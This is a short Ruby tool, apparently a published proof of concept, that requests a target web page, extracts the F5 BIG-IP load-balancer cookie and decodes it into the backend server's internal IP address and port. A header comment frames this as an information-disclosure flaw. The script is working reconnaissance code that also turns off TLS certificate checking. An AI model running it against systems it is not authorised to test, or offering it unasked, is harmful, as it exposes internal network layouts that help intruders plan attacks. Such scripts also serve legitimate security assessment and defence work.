=begin

The BIG-IP system inserts a cookie into the HTTP response, by default, is named BIGipServer<pool_name> and the cookie value contains the encoded IP address and port of the destination server.

This behavior can cause disclose local IP address of Web Server.

Reference:

* https://support.f5.com/kb/en-us/solutions/public/6000/900/sol6917.html

=end

require 'net/http'
require 'net/https'

def getCookie(url)

	getURI = URI(url)
	getConnection = Net::HTTP.new(getURI.host, getURI.port)
	getCookie = nil

	if url.include? 'https://'
		getConnection.use_ssl = true
		getConnection.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end

	begin
		getResponse = getConnection.get(getURI, {
			'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
			'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
			'Accept-Language' => 'en-US,en;q=0.8',
		})
		unless getResponse.response['Set-cookie'] == nil
			unless getResponse.response['Set-cookie'].match('BIGip.*') == nil
				getCookie = getResponse.response['Set-cookie'].match('BIGip.*').to_s.split('\; ')[0].split('=')[1].split(';')[0]
			end
		end
	rescue Exception => errors
		puts "Error: #{errors}"
	end

	return getCookie

end

def decodeCookie(value)

	if value == nil
		puts "\nError found!\n\n"
	else
		cookie	     = value.split(".") 
		encoded_ip   = cookie[0].to_i
		encoded_port = cookie[1].to_i
		ip = []
		port = []

		4.times do
			ip << encoded_ip%256
			encoded_ip /= 256
		end

		2.times do
			port << encoded_port%256
			encoded_port /= 256
		end

		ip = ip.join(".")
		port = port[0]*256 + port[1]

		unless ip.to_s == '0.0.0.0'
			puts "\nIP address found!\n\nIP Address  : #{ip}\nPort        : #{port}\n\n"
		end
	end
end

# Help description
usage = "\nUsage:\n\n"
usage += "  ruby bigip.rb [-h] [-u URL_TARGET] [-d BIGIP_COOKIE_VALUE]\n\n\n"
usage += "Options:\n\n"
usage += "  -d    Decode the cookie value.\n"
usage += "  -h    Print a summary of the usage.\n"
usage += "  -u    Get the BIGip value in target and decode.\n\n"
usage += "Examples:\n\n"
usage += "  ~$ ruby bigip.rb -d 1677787402.36895.0000\n\n"
usage += "  IP address found:\n\n"
usage += "  IP Address : 10.33.70.12\n"
usage += "  Port       : 443\n\n"
usage += "  ~$ ruby bigip.rb -u https://example.com/\n\n"
usage += "  BIGip cookie: 1677787402.36895.0000\n\n"
usage += "  IP address found:\n\n"
usage += "  IP Address : 10.33.70.12\n"
usage += "  Port       : 443\n\n"

case ARGV[0].to_s
when '-u' then
	cookie = getCookie(ARGV[1])
	puts "\nBIGip cookie: #{cookie}"
	decodeCookie(cookie)
when '-d' then
	decodeCookie(ARGV[1])
when '-h' then
	puts usage
else
	puts "\nUnknown option: #{ARGV[0].inspect}\n#{usage}"
end
